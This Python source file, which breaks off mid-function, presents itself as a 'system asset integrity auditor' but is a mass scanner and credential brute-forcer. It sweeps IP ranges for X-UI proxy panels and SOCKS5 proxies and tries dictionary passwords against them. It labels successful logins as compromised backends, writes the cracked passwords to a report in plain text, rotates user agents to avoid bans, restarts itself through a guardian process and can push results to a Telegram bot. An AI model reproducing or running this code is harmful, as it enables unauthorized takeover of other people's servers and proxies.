import asyncio
import ipaddress
import random
import time
import sys
import os
import string
import json
import signal
import subprocess
import ctypes
import ssl
import re
import unicodedata
import urllib.parse
import urllib.request
from datetime import datetime

# ============================================================
#  SYSTEM ASSET INTEGRITY AUDITOR (SAIA) v23.5 - 极光UI显密版
# ============================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_FILE = os.path.join(BASE_DIR, "sys_audit_state.json")
LOG_FILE = os.path.join(BASE_DIR, "sys_audit_events.log")
REPORT_FILE = os.path.join(BASE_DIR, "audit_report.log")
NODE_FILE = os.path.join(BASE_DIR, "nodes.list")
FALLBACK_NODE_FILE = os.path.join(BASE_DIR, "ip.txt")
FALLBACK_NODE_FILE_UPPER = os.path.join(BASE_DIR, "IP.TXT")
TOKEN_FILE = os.path.join(BASE_DIR, "tokens.list")
FALLBACK_TOKEN_FILE = os.path.join(BASE_DIR, "pass.txt")
GUARDIAN_STATE_FILE = os.path.join(BASE_DIR, "sys_guardian_state.json")
TELEGRAM_CFG_FILE = os.path.join(BASE_DIR, "telegram_notify.json")
RESUME_CFG_FILE = os.path.join(BASE_DIR, "resume_config.json")
CHECKPOINT_FILE = os.path.join(BASE_DIR, "audit_checkpoint.json")
MAX_LOG_BYTES = 2 * 1024 * 1024
MAX_REPORT_BYTES = 8 * 1024 * 1024
LOG_BACKUPS = 5
REPORT_BACKUPS = 3
STATE_FLUSH_INTERVAL = 1.0
CHECKPOINT_FLUSH_INTERVAL = 3.0
MAX_SOCKET_CONCURRENCY = 600
ADAPT_CHECK_INTERVAL = 2.0
ADAPT_MIN_CONCURRENCY = 100
ADAPT_MAX_CONCURRENCY = 1000
ADAPT_STEP_UP = 50
ADAPT_STEP_DOWN = 100
ADAPT_LOW_MB = 800.0
ADAPT_HIGH_MB = 2048.0
EXPOSE_SECRET_IN_REPORT = True
MAX_EXPANDED_TARGETS_PER_ENTRY = 65536
DEFAULT_XUI_PORTS = "54321,2053"
DEFAULT_S5_PORTS = (
    "1080-1090,1111,2222,3333,4444,5555,6666,7777,8888,9999,"
    "1234,4321,8000,9000,6868,6688,8866,9527,1472,2583,3694,10000-10010"
)
DEFAULT_MIXED_PORTS = f"{DEFAULT_XUI_PORTS},{DEFAULT_S5_PORTS}"
ASN_DB_FILE = os.path.join(BASE_DIR, "GeoLite2-ASN.mmdb")
COUNTRY_DB_CANDIDATES = [
    os.path.join(BASE_DIR, "GeoLite2-Country.mmdb"),
    os.path.join(BASE_DIR, "geolite2-country.mmdb"),
]

# Anti-Ban 浏览器指纹池
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
]

# 视觉配置 (极光配色)
C_BOLD, C_W = "\033[1m", "\033[0m"
C_BLUE = "\033[38;5;39m"  # 边框蓝
C_CYAN = "\033[38;5;51m"  # 标题青
C_PROC = "\033[38;5;48m"  # 进度绿
C_WARN = "\033[38;5;214m"  # 警告橙
C_SUCC = "\033[38;5;46m"  # 成功绿
C_DIM = "\033[2m"  # 暗色

# ==================== 工具函数 ====================


def now_ts():
    return time.time()


async def close_writer(writer):
    if writer:
        try:
            writer.close()
            await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
        except (OSError, asyncio.TimeoutError):
            pass


def save_state(path, state):
    try:
        with open(path + ".tmp", "w", encoding="utf-8") as f:
            json.dump(state, f, ensure_ascii=False, indent=2)
        os.replace(path + ".tmp", path)
    except OSError:
        pass


def load_state(path):
    if not os.path.exists(path):
        return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except (OSError, json.JSONDecodeError):
        return {}


def rotate_file_if_needed(file_path, max_bytes, backup_count):
    try:
        if not os.path.exists(file_path):
            return
        if os.path.getsize(file_path) < max_bytes:
            return
        for i in range(backup_count, 0, -1):
            src = file_path if i == 1 else f"{file_path}.{i - 1}"
            dst = f"{file_path}.{i}"
            if os.path.exists(src):
                if os.path.exists(dst):
                    os.remove(dst)
                os.replace(src, dst)
    except OSError:
        pass


def append_rotating(file_path, text, max_bytes, backup_count):
    rotate_file_if_needed(file_path, max_bytes, backup_count)
    try:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(text)
    except OSError:
        pass


def log_event(msg):
    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    append_rotating(LOG_FILE, f"[{stamp}] {msg}\n", MAX_LOG_BYTES, LOG_BACKUPS)


# --- 用这段代码替换原有的 read_last_lines 函数 ---
def read_last_lines(path, lines=50, filter_keywords=None):
    if not os.path.exists(path):
        return ""
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            all_lines = f.readlines()
            # 如果按键11或3传来了关键词，就只保留包含这些词的行
            if filter_keywords:
                all_lines = [
                    l for l in all_lines if any(k in l for k in filter_keywords)
                ]
            return "".join(all_lines[-lines:])
    except:
        return ""


def mode_label(mode):
    return {1: "XUI专项", 2: "S5专项", 3: "深度全能"}.get(mode, str(mode))


def work_mode_label(work_mode):
    return {1: "探索", 2: "探索+验真", 3: "只验真"}.get(work_mode, str(work_mode))


def render_progress_bar(done, total, width=28):
    if total <= 0:
        return f"[{C_DIM}{'-' * width}{C_W}] 0%"
    ratio = max(0.0, min(1.0, done / total))
    fill = int(width * ratio)
    # 使用渐变色进度条
    bar_str = f"{C_PROC}{'━' * fill}{C_DIM}{'━' * (width - fill)}{C_W}"
    return f"[{bar_str}] {ratio * 100:5.1f}%"


def resolve_node_file():
    if os.path.exists(NODE_FILE):
        return NODE_FILE
    if os.path.exists(FALLBACK_NODE_FILE):
        return FALLBACK_NODE_FILE
    if os.path.exists(FALLBACK_NODE_FILE_UPPER):
        return FALLBACK_NODE_FILE_UPPER
    return None


def resolve_node_files():
    files = []
    if os.path.exists(NODE_FILE):
        files.append(NODE_FILE)
    if os.path.exists(FALLBACK_NODE_FILE):
        files.append(FALLBACK_NODE_FILE)
    if os.path.exists(FALLBACK_NODE_FILE_UPPER):
        files.append(FALLBACK_NODE_FILE_UPPER)
    return files


def resolve_token_file():
    if os.path.exists(TOKEN_FILE):
        return TOKEN_FILE
    if os.path.exists(FALLBACK_TOKEN_FILE):
        return FALLBACK_TOKEN_FILE
    return None


def mask_secret(secret):
    if EXPOSE_SECRET_IN_REPORT:
        return secret
    return "***"


def default_telegram_config():
    return {
        "enabled": False,
        "bot_token": "",
        "chat_id": "",
        "interval_minutes": 0,
        "condition_mode": 2,
        "verified_threshold": 5,
    }


def default_resume_config():
    return {"enabled": True}


def load_resume_config():
    cfg = default_resume_config()
    data = load_state(RESUME_CFG_FILE)
    if isinstance(data, dict):
        cfg.update(data)
    cfg["enabled"] = bool(cfg.get("enabled", True))
    return cfg


def save_resume_config(cfg):
    save_state(RESUME_CFG_FILE, cfg)


def clear_checkpoint():
    try:
        if os.path.exists(CHECKPOINT_FILE):
            os.remove(CHECKPOINT_FILE)
    except OSError:
        pass


def load_telegram_config():
    cfg = default_telegram_config()
    data = load_state(TELEGRAM_CFG_FILE)
    if isinstance(data, dict):
        cfg.update(data)
    cfg["enabled"] = bool(cfg.get("enabled", False))
    cfg["bot_token"] = str(cfg.get("bot_token", "")).strip()
    cfg["chat_id"] = str(cfg.get("chat_id", "")).strip()
    try:
        cfg["interval_minutes"] = max(0, int(cfg.get("interval_minutes", 0)))
    except (TypeError, ValueError):
        cfg["interval_minutes"] = 0
    try:
        c_mode = int(cfg.get("condition_mode", 2))
    except (TypeError, ValueError):
        c_mode = 2
    cfg["condition_mode"] = c_mode if c_mode in (0, 1, 2, 3, 4) else 2
    try:
        cfg["verified_threshold"] = max(1, int(cfg.get("verified_threshold", 5)))
    except (TypeError, ValueError):
        cfg["verified_threshold"] = 5
    return cfg


def save_telegram_config(cfg):
    save_state(TELEGRAM_CFG_FILE, cfg)


def telegram_condition_label(mode):
    return {
        0: "关闭条件推送",
        1: "发现即推送",
        2: "仅验真推送",
        3: "发现+验真推送",
        4: "完成或验真>=阈值(单次)",
    }.get(mode, str(mode))


def send_telegram_message(bot_token, chat_id, text):
    if not bot_token or not chat_id:
        return False, "missing token/chat_id"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = urllib.parse.urlencode(
        {
            "chat_id": chat_id,
            "text": text[:3800],
            "disable_web_page_preview": "true",
        }
    ).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            return '"ok":true' in body, body[:200]
    except Exception as exc:
        return False, str(exc)


async def send_telegram_message_async(bot_token, chat_id, text):
    return await asyncio.to_thread(send_telegram_message, bot_token, chat_id, text)


def get_geo_info(ip):
    country, asn = "-", "-"
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return country, asn
    try:
        import geoip2.database
    except Exception:
        return country, asn

    if not hasattr(get_geo_info, "_country_reader"):
        reader = None
        for path in COUNTRY_DB_CANDIDATES:
            if os.path.exists(path):
                try:
                    reader = geoip2.database.Reader(path)
                except Exception:
                    reader = None
                break
        setattr(get_geo_info, "_country_reader", reader)

    if not hasattr(get_geo_info, "_asn_reader"):
        reader = None
        if os.path.exists(ASN_DB_FILE):
            try:
                reader = geoip2.database.Reader(ASN_DB_FILE)
            except Exception:
                reader = None
        setattr(get_geo_info, "_asn_reader", reader)

    cr = getattr(get_geo_info, "_country_reader")
    ar = getattr(get_geo_info, "_asn_reader")

    if cr:
        try:
            country = cr.country(ip).country.iso_code or "-"
        except Exception:
            pass
    if ar:
        try:
            num = ar.asn(ip).autonomous_system_number
            if num:
                asn = f"AS{num}"
        except Exception:
            pass
    return country, asn


def is_alive(pid):
    if not pid or pid <= 0:
        return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def stop_process(pid):
    if not is_alive(pid):
        return False
    try:
        if os.name == "nt":
            subprocess.run(
                ["cmd", "/c", "taskkill", "/PID", str(pid), "/F"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False,
            )
            return True
        os.kill(pid, signal.SIGTERM)
        return True
    except OSError:
        return False


def parse_ports(raw):
    ports = []
    try:
        for p in raw.replace(" ", "").split(","):
            if not p:
                continue
            if "-" in p:
                s, e = map(int, p.split("-", 1))
                s, e = max(1, min(65535, s)), max(1, min(65535, e))
                ports.extend(range(min(s, e), max(s, e) + 1))
            else:
                pn = int(p)
                if 1 <= pn <= 65535:
                    ports.append(pn)
    except ValueError:
        return []
    return sorted(set(ports))


def expand_target_entry(raw_target, max_items=MAX_EXPANDED_TARGETS_PER_ENTRY):
    target = raw_target.strip()
    if not target:
        return [target], False

    if "/" in target:
        try:
            net = ipaddress.ip_network(target, strict=False)
            out = []
            iterator = net.hosts() if net.num_addresses > 1 else [net.network_address]
            for idx, ip_obj in enumerate(iterator):
                if idx >= max_items:
                    return out, True
                out.append(str(ip_obj))
            return out, False
        except ValueError:
            pass

    if "-" in target:
        left, right = target.split("-", 1)
        left = left.strip()
        right = right.strip()

        try:
            start_ip = ipaddress.ip_address(left)
            end_ip = ipaddress.ip_address(right)
            if start_ip.version == end_ip.version and int(end_ip) >= int(start_ip):
                span = int(end_ip) - int(start_ip) + 1
                count = min(span, max_items)
                out = [
                    str(ipaddress.ip_address(int(start_ip) + i)) for i in range(count)
                ]
                return out, span > max_items
        except ValueError:
            pass

        try:
            start_ip = ipaddress.ip_address(left)
            if start_ip.version == 4 and right.isdigit():
                parts = left.split(".")
                start_last = int(parts[-1])
                end_last = int(right)
                if 0 <= end_last <= 255 and end_last >= start_last:
                    base = ".".join(parts[:3])
                    span = end_last - start_last + 1
                    count = min(span, max_items)
                    out = [f"{base}.{start_last + i}" for i in range(count)]
                    return out, span > max_items
        except ValueError:
            pass

    return [target], False


def prompt_int(msg, default, min_value=None, max_value=None):
    while True:
        raw = input(msg).strip()
        if not raw:
            return default
        try:
            value = int(raw)
        except ValueError:
            print("输入无效，请输入整数。")
            continue
        if min_value is not None and value < min_value:
            print(f"输入过小。")
            continue
        if max_value is not None and value > max_value:
            print(f"输入过大。")
            continue
        return value


def prompt_float(msg, default, min_value=None):
    while True:
        raw = input(msg).strip()
        if not raw:
            return default
        try:
            value = float(raw)
        except ValueError:
            print("输入无效，请输入数字。")
            continue
        if min_value is not None and value < min_value:
            print(f"输入过小。")
            continue
        return value


def get_available_memory_mb():
    if os.name == "nt":

        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
            return stat.ullAvailPhys / 1024 / 1024
        return None

    if sys.platform.startswith("freebsd"):
        try:
            page_size = int(
                subprocess.check_output(
                    ["sysctl", "-n", "hw.pagesize"], text=True
                ).strip()
            )
            free_pages = int(
                subprocess.check_output(
                    ["sysctl", "-n", "vm.stats.vm.v_free_count"], text=True
                ).strip()
            )
            inactive_pages = int(
                subprocess.check_output(
                    ["sysctl", "-n", "vm.stats.vm.v_inactive_count"], text=True
                ).strip()
            )
            cache_pages = int(
                subprocess.check_output(
                    ["sysctl", "-n", "vm.stats.vm.v_cache_count"], text=True
                ).strip()
            )
            return (
                (page_size * (free_pages + inactive_pages + cache_pages)) / 1024 / 1024
            )
        except:
            return None

    meminfo = "/proc/meminfo"
    if os.path.exists(meminfo):
        try:
            with open(meminfo, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    if line.startswith("MemAvailable:"):
                        return int(line.split()[1]) / 1024
        except OSError:
            return None
    return 1024.0


def get_total_memory_mb():
    if os.name == "nt":

        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
            return stat.ullTotalPhys / 1024 / 1024
        return None

    meminfo = "/proc/meminfo"
    if os.path.exists(meminfo):
        try:
            with open(meminfo, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    if line.startswith("MemTotal:"):
                        return int(line.split()[1]) / 1024
        except OSError:
            return None
    return None


def get_cpu_usage_percent():
    if os.name == "nt":

        class FILETIME(ctypes.Structure):
            _fields_ = [
                ("dwLowDateTime", ctypes.c_ulong),
                ("dwHighDateTime", ctypes.c_ulong),
            ]

        idle_t, kernel_t, user_t = FILETIME(), FILETIME(), FILETIME()
        ok = ctypes.windll.kernel32.GetSystemTimes(
            ctypes.byref(idle_t), ctypes.byref(kernel_t), ctypes.byref(user_t)
        )
        if not ok:
            return None

        def to_int(ft):
            return (ft.dwHighDateTime << 32) | ft.dwLowDateTime

        idle = to_int(idle_t)
        kernel = to_int(kernel_t)
        user = to_int(user_t)
        total = kernel + user

        prev = getattr(get_cpu_usage_percent, "_win_prev", None)
        setattr(get_cpu_usage_percent, "_win_prev", (idle, total))
        if not prev:
            return None
        idle_delta = idle - prev[0]
        total_delta = total - prev[1]
        if total_delta <= 0:
            return None
        return max(0.0, min(100.0, (1.0 - idle_delta / total_delta) * 100.0))

    proc_stat = "/proc/stat"
    if os.path.exists(proc_stat):
        try:
            with open(proc_stat, "r", encoding="utf-8", errors="replace") as f:
                line = f.readline().strip()
            if not line.startswith("cpu "):
                return None
            vals = [int(x) for x in line.split()[1:]]
            idle = vals[3] + (vals[4] if len(vals) > 4 else 0)
            total = sum(vals)
            prev = getattr(get_cpu_usage_percent, "_linux_prev", None)
            setattr(get_cpu_usage_percent, "_linux_prev", (idle, total))
            if not prev:
                return None
            idle_delta = idle - prev[0]
            total_delta = total - prev[1]
            if total_delta <= 0:
                return None
            return max(0.0, min(100.0, (1.0 - idle_delta / total_delta) * 100.0))
        except (OSError, ValueError):
            return None

    try:
        load = os.getloadavg()[0]
        cpu_count = max(1, os.cpu_count() or 1)
        return max(0.0, min(100.0, (load / cpu_count) * 100.0))
    except (OSError, AttributeError):
        return None


class AdaptiveLimiter:
    def __init__(self, capacity):
        self._capacity = max(1, int(capacity))
        self._in_use = 0
        self._cv = asyncio.Condition()

    async def acquire(self):
        async with self._cv:
            while self._in_use >= self._capacity:
                await self._cv.wait()
            self._in_use += 1

    async def release(self):
        async with self._cv:
            if self._in_use > 0:
                self._in_use -= 1
            self._cv.notify_all()

    async def set_capacity(self, capacity):
        async with self._cv:
            self._capacity = max(1, int(capacity))
            self._cv.notify_all()

    async def snapshot(self):
        async with self._cv:
            return self._capacity, self._in_use

    async def __aenter__(self):
        await self.acquire()
        return self

    async def __aexit__(self, exc_type, exc, tb):
        await self.release()


def run_guardian(
    mode,
    work_mode,
    threads,
    ports_str,
    feed_int=0.05,
    check_interval=20,
    min_free_mb=256.0,
):
    save_state(
        GUARDIAN_STATE_FILE,
        {
            "pid": os.getpid(),
            "status": "running",
            "mode": mode,
            "work_mode": work_mode,
            "threads": threads,
            "ports": ports_str,
            "updated_at": now_ts(),
            "min_free_mb": min_free_mb,
            "check_interval": check_interval,
            "feed_int": feed_int,
        },
    )
    log_event(
        f"Guardian started mode={mode} work_mode={work_mode} threads={threads} ports={ports_str} "
    )
    last_restart_ts = 0.0
    min_restart_gap = max(10.0, float(check_interval))
    while True:
        mem_mb = get_available_memory_mb()
        st = load_state(STATE_FILE)
        if not is_alive(st.get("pid")):
            if mem_mb is None or mem_mb >= min_free_mb:
                now = now_ts()
                if now - last_restart_ts >= min_restart_gap:
                    subprocess.Popen(
                        [
                            sys.executable,
                            __file__,
                            "run",
                            str(mode),
                            str(work_mode),
                            str(threads),
                            ports_str,
                            str(feed_int),
                        ],
                        start_new_session=True,
                    )
                    last_restart_ts = now
            else:
                log_event(
                    f"Guardian wait: low memory {mem_mb:.0f}MB < {min_free_mb:.0f}MB"
                )
        gs = load_state(GUARDIAN_STATE_FILE)
        gs["updated_at"] = now_ts()
        gs["last_free_mb"] = mem_mb
        save_state(GUARDIAN_STATE_FILE, gs)
        time.sleep(check_interval)


# ==================== 审计核心 (逻辑不变，输出格式显密) ====================


async def audit_xui(ip, port, tokens, state, state_lock, work_mode, conn_limiter):
    async def fetch_page(path, use_ssl=False, method="GET", payload=""):
        writer = None
        try:
            ssl_ctx = ssl.create_default_context() if use_ssl else None
            if ssl_ctx is not None:
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE
            async with conn_limiter:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port, ssl=ssl_ctx if use_ssl else None),
                    timeout=3.5,
                )
            ua = random.choice(USER_AGENTS)
            if method == "GET":
                req = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\nConnection: close\r\n\r\n"
            else:
                req = f"POST {path} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(payload)}\r\nConnection: close\r\n\r\n{payload}"
            writer.write(req.encode("utf-8", errors="ignore"))
            await writer.drain()
            return await asyncio.wait_for(reader.read(16384), timeout=4.0)
        except Exception:
            return b""
        finally:
            await close_writer(writer)

    def match_xui(data):
        low = data.lower()
        if b"x-ui" in low or b"3x-ui" in low or b"/xui" in low:
            return True
        if b"/login" in low and (
            b"username" in low or b"password" in low or b"signin" in low
        ):
            return True
        if b"/assets/ant-design-vue/antd.min.css" in low and (
            b"/assets/css/custom.min.css" in low
            or b"/assets/element-ui/theme-chalk/display.css" in low
        ):
            return True
        if b"-welcome</title>" in low and b"/assets/js/" in low:
            return True
        return False

    def check_auth_success(data):
        low = data.lower()
        no_space = low.replace(b" ", b"")
        if b'"success":true' in no_space:
            return True
        if b"set-cookie:session=" in no_space:
            return True
        if b"set-cookie:x-ui" in no_space:
            return True
        if b"http/1.1302" in no_space and b"location:/panel" in no_space:
            return True
        return False

    probes_to_try = [("/", False), ("/login", False), ("/", True), ("/login", True)]
    tried = set()
    found_candidates = []

    while probes_to_try:
        path, use_ssl = probes_to_try.pop(0)
        if (path, use_ssl) in tried:
            continue
        tried.add((path, use_ssl))
        data = await fetch_page(path, use_ssl=use_ssl)
        if not data:
            continue

        loc_match = re.search(rb"Location:\s*([^\r\n]+)", data, re.IGNORECASE)
        if loc_match:
            loc = loc_match.group(1).decode("utf-8", "ignore").strip()
            if loc.startswith("/") and (loc, use_ssl) not in tried:
                probes_to_try.append((loc, use_ssl))

        if match_xui(data):
            proto = "https" if use_ssl else "http"
            country, asn = get_geo_info(ip)
            login_path = path if "login" in path else path.rstrip("/") + "/login"
            candidate = (proto, use_ssl, country, asn, login_path)
            if candidate not in found_candidates:
                found_candidates.append(candidate)
            if work_mode in (1, 2):
                async with state_lock:
                    state["xui_found"] += 1
            if work_mode == 1:
                return f"[资产-面板存活] {ip}:{port} | {country} | {asn} | 协议:{proto} 路径:{path}"
            continue

    if found_candidates and tokens:
        for proto, use_ssl, country, asn, login_path in found_candidates:
            for u, p in tokens:
                payload = (
                    f"username={urllib.parse.quote(u)}&password={urllib.parse.quote(p)}"
                )
                login_resp = await fetch_page(
                    login_path, use_ssl=use_ssl, method="POST", payload=payload
                )
                if check_auth_success(login_resp):
                    async with state_lock:
                        state["xui_verified"] += 1
                    return f"[高危-后台沦陷] {ip}:{port}:{u}:{mask_secret(p)} | {country} | {asn} | 登录成功({proto})"

        if work_mode == 2:
            proto, _, country, asn, _ = found_candidates[0]
            return (
                f"[资产-面板存活] {ip}:{port} | {country} | {asn} | 字典未命中({proto})"
            )
    return None


async def audit_socks5(ip, port, tokens, state, state_lock, work_mode, conn_limiter):
    async def check_l7(reader, writer):
        try:
            req = b"GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nUser-Agent: curl/7.68.0\r\nConnection: close\r\n\r\n"
            writer.write(req)
            await writer.drain()
            res = await asyncio.wait_for(reader.read(1024), timeout=3.0)
            if b"HTTP/1." in res or b"301 Moved" in res or b"<html>" in res.lower():
                return True
        except Exception:
            pass
        return False

    writer = None
    try:
        async with conn_limiter:
            r, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=3.0
            )
        writer.write(b"\x05\x02\x00\x02")
        await writer.drain()
        res = await asyncio.wait_for(r.read(2), timeout=2.0)
        if not res or res[0] != 5:
            return None

        if res[1] == 0x00:
            if work_mode in (1, 2):
                async with state_lock:
                    state["s5_found"] += 1
            country, asn = get_geo_info(ip)
            if work_mode == 1:
                return f"[节点-可连通] {ip}:{port} | S5-OPEN | {country} | {asn}"

            await close_writer(writer)
            async with conn_limiter:
                r2, w2 = await asyncio.wait_for(
                    asyncio.open_connection(ip, port), timeout=2.5
                )
            try:
                start = time.perf_counter()
                w2.write(b"\x05\x01\x00\x01\x01\x01\x01\x01\x00\x50")
                await w2.drain()
                ack = await asyncio.wait_for(r2.read(10), timeout=2.5)
                if ack and ack[1] == 0x00:
                    lat = int((time.perf_counter() - start) * 1000)
                    l7_ok = await check_l7(r2, w2)
                    if l7_ok:
                        async with state_lock:
                            state["s5_verified"] += 1
                        return f"[优质-真穿透] {ip}:{port} | S5-OPEN | {country} | {asn} | RTT:{lat}ms"
                    elif work_mode == 2:
                        return f"[节点-可连通] {ip}:{port} | S5-OPEN | {country} | {asn} | 仅握手成功"
            finally:
                await close_writer(w2)

        if res[1] == 0x02 and tokens:
            if work_mode in (1, 2):
                async with state_lock:
                    state["s5_found"] += 1
            country, asn = get_geo_info(ip)
            if work_mode == 1:
                return f"[资产-加密节点] {ip}:{port} | S5-AUTH | {country} | {asn}"

            await close_writer(writer)
            for u, p in tokens:
                w3 = None
                try:
                    async with conn_limiter:
                        r3, w3 = await asyncio.wait_for(
                            asyncio.open_connection(ip, port), timeout=2.0
                        )
                    w3.write(b"\x05\x01\x02")
                    await w3.drain()
                    await r3.read(2)
                    w3.write(
                        b"\x01"
                        + bytes([len(u)])
                        + u.encode()
                        + bytes([len(p)])
                        + p.encode()
                    )
                    await w3.drain()
                    auth = await asyncio.wait_for(r3.read(2), timeout=2.0)
                    if auth and auth[1] == 0x00:
                        start = time.perf_counter()
                        w3.write(b"\x05\x01\x00\x01\x01\x01\x01\x01\x00\x50")
                        await w3.drain()
                        ack = await asyncio.wait_for(r3.read(10), timeout=2.5)
                        l7_ok = False
                        lat = 0
                        if ack and ack[1] == 0x00:
                            lat = int((time.perf_counter() - start) * 1000)
                            l7_ok = await check_l7(r3, w3)

                        if l7_ok:
                            async with state_lock:
                                state["s5_verified"] += 1
                            return f"[优质-真穿透] {ip}:{port}:{u}:{mask_secret(p)} | S5-AUTH | {country} | {asn} | RTT:{lat}ms"
                        elif work_mode == 2:
                            return f"[节点-可连通] {ip}:{port}:{u}:{mask_secret(p)} | S5-AUTH | {country} | {asn} | 无L7能力"
                except (asyncio.TimeoutError, OSError, ValueError):
                    continue
                finally:
                    await close_writer(w3)
    except (asyncio.TimeoutError, OSError, ValueError):
        pass
    finally:
        await close_writer(writer)
    return None


# ==================== 后台调度 ====================


async def internal_audit_process(mode, work_mode, threads, ports, feed_int):
    state = {
        "status": "running",
        "pid": os.getpid(),
        "total": 0,
        "done": 0,
        "xui_found": 0,
        "xui_verified": 0,
        "s5_found": 0,
        "s5_verified": 0,
        "active_workers": 0,
        "work_mode": work_mode,
        "recent": [],
        "started_at": now_ts(),
        "current": "Initializing...",
    }
    save_state(STATE_FILE, state)
    state_lock = asyncio.Lock()
    flush_stop = asyncio.Event()
    resume_cfg = load_resume_config()
    resume_enabled = bool(resume_cfg.get("enabled", True))
    session_key = f"{mode}|{work_mode}|{','.join(str(p) for p in ports)}"
    done_targets = set()
    if resume_enabled:
        cp = load_state(CHECKPOINT_FILE)
        if cp.get("session_key") == session_key:
            raw_done = cp.get("done_targets", [])
            if isinstance(raw_done, list):
                done_targets = {str(x) for x in raw_done if str(x).strip()}
    state["resume_enabled"] = resume_enabled
    state["resume_restored"] = len(done_targets)
    tg_cfg = load_telegram_config()
    tg_enabled = (
        tg_cfg.get("enabled")
        and bool(tg_cfg.get("bot_token"))
        and bool(tg_cfg.get("chat_id"))
    )
    tg_interval_sec = max(0, int(tg_cfg.get("interval_minutes", 0))) * 60
    tg_condition_mode = int(tg_cfg.get("condition_mode", 2))
    tg_verified_threshold = int(tg_cfg.get("verified_threshold", 5))
    last_interval_push_ts = 0.0
    special_or_sent = False
    notify_tasks = set()

    q = asyncio.Queue(maxsize=max(threads * 4, 4096))
    adaptive_min = min(ADAPT_MIN_CONCURRENCY, max(10, threads))
    adaptive_max = max(adaptive_min, min(threads, ADAPT_MAX_CONCURRENCY))
    socket_limit = max(50, min(MAX_SOCKET_CONCURRENCY, adaptive_max))
    conn_limiter = AdaptiveLimiter(socket_limit)
    state["socket_limit"] = socket_limit
    state["socket_in_use"] = 0
    state["free_mb"] = get_available_memory_mb()

    if mode == 3:
        xui_ports = parse_ports(DEFAULT_XUI_PORTS)
        s5_ports = parse_ports(DEFAULT_S5_PORTS)
    elif mode == 1:
        xui_ports = list(ports)
        s5_ports = []
    else:
        xui_ports = []
        s5_ports = list(ports)

    async def push_telegram(text):
        if not tg_enabled:
            return
        ok, detail = await send_telegram_message_async(
            tg_cfg["bot_token"], tg_cfg["chat_id"], text
        )
        if not ok:
            log_event(f"Telegram send failed: {detail}")

    def schedule_telegram(text):
        if not tg_enabled:
            return
        task = asyncio.create_task(push_telegram(text))
        notify_tasks.add(task)
        task.add_done_callback(lambda t: notify_tasks.discard(t))

    def should_push_condition(line):
        is_verified = ("[高危-后台沦陷]" in line) or ("[优质-真穿透]" in line)
        is_found = (
            ("[资产-面板存活]" in line)
            or ("[节点-可连通]" in line)
            or ("[资产-加密节点]" in line)
        )
        if tg_condition_mode == 0:
            return False
        if tg_condition_mode == 1:
            return is_found or is_verified
        if tg_condition_mode == 2:
            return is_verified
        if tg_condition_mode == 3:
            return is_found or is_verified
        if tg_condition_mode == 4:
            return False
        return False

    def build_interval_message(snapshot, recent_lines):
        return (
            f"SAIA 审计定时推送\n"
            f"模式: {mode_label(mode)} / {work_mode_label(work_mode)}\n"
            f"进度: {snapshot.get('done', 0)}/{snapshot.get('total', 0)}\n"
            f"XUI: 发现 {snapshot.get('xui_found', 0)} / 验真 {snapshot.get('xui_verified', 0)}\n"
            f"S5: 连通 {snapshot.get('s5_found', 0)} / 验真 {snapshot.get('s5_verified', 0)}\n"
